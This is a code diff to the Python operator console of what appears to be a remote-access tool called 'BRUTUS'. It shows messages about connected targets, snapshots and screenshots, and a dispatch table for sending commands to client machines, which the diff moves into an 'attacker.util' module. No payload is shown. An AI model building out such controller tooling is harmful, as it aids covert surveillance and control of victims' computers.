@@ -19,9 +19,8 @@ import requests
 import json
 from bs4 import BeautifulSoup
 import locator
-import Command  # import the OO-Command module
-
-
+import Command
+from attacker.util import *
 
 """ constants """
 VERSION = "BRUTUS V. 1.0 Beta"
@@ -35,24 +34,6 @@ ip = ""
 connections = {}
 window = None
 video_thread = None
-
-# String templates and helpers to avoid inconsistent inline formatting
-HEADER_TEMPLATE = "{version:<40}{ip}"
-CLIENT_HEADER = "ID\t\t       Address\t\t\t   Location\n\n"
-CLIENT_ROW_TEMPLATE = "{id}\t\t{addr}\t\t{location}"
-IP_TEMPLATE = "Current IP: {ip}"
-ERROR_CLIENT_NOT_FOUND = "[ ! ] ERROR Client not found."
-UNKNOWN_COMMAND_TEMPLATE = "[ ? ] Unknown command: {command}"
-CONN_CONNECT_TEMPLATE = "{time}  Target {addr!r} connected to the server."
-CONN_DISCONNECT_TEMPLATE = "{time}  Target {addr!r} disconnected from the server."
-CONN_LOST_TEMPLATE = "{time}  Target {addr!r} lost connection to the server."
-SNAPSHOT_SAVED_TEMPLATE = "\n{time} Snapshot saved to: {path}"
-SCREENSHOT_SAVED_TEMPLATE = "\n{time} Screenshot saved to: {path}"
-TIME_FMT = "%H:%M:%S"
-
-def ts():
-    """Return current timestamp string according to TIME_FMT."""
-    return time.strftime(TIME_FMT)
 
 
 
@@ -94,19 +75,6 @@ def _cmd_send_at(window, command):
         window.Input.clear()
     except Exception:
         window.Output.addItem(ERROR_CLIENT_NOT_FOUND)
-
-commands = {
-    "ip": _cmd_ip,
-    "clear": lambda w, c=None: _cmd_show_header(w),
-    "quit": _cmd_quit,
-    "exit": _cmd_quit,
-    "echo ": _cmd_echo,            # prefix: "echo <text>"
-    "show_clients": _cmd_show_clients,
-    "show clients": _cmd_show_clients,
-    "sc": _cmd_show_clients,
-    # '@' is handled as pattern "<id>@<cmd>"
-    "@": _cmd_send_at,
-}
 
 
 
